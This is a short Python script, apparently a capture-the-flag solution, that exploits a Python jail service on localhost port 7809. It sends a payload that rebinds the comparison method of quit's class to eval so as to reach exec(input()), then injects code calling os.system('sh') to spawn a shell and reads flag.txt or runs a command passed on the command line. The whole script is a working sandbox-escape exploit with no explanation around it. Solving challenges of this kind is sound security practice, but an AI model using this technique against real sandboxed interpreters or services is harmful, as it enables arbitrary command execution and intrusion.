import socket
import sys
import time

CODE = """
x=quit
x.__class__.__lt__=eval
x<'exec(input())'
"""

CODE = CODE.strip().replace("\n", ";")
CODE = CODE + ";" + CODE[::-1]

print("Payload: %s" % CODE)
print("Length: %d" % len(CODE))

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("127.0.0.1", 7809))
sock.send(CODE.encode() + b"\n")
time.sleep(0.1)
sock.send(b"print(\"__import__('os').system('sh')\");exit()\n")

time.sleep(0.1)
if len(sys.argv)>1:
    sock.send(sys.argv[1].encode()+b"\n")
else:
    sock.send(b"cat flag.txt\n")
sock.send(b"exit\n")

out = b""
while True:
    rcv = sock.recv(2048)
    if not rcv: break
    out += rcv
print(out.decode().strip())
